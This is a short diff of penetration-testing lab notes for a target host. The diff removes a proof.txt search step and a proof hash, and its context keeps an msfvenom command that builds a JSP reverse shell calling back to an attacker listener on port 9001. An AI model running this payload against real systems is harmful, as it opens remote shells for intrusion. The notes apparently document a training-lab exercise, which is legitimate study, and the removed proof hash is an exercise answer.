@@ -47,16 +47,5 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.138 LPORT=9001 -f raw -
 **Mapping directory**
 ``C:\Inetpub\wwwroot\CFIDE``
 
-**search for proof.txt**
-```
-cd c:\
-dir "proof.txt" /s
-```
-
-**proof.txt**
-```
-a416a831fddf36aa8c01ba0674ca7bf8
-```
-
 
 ![[10.11.1.10 - mike (done)/screenshots/proof.png]]
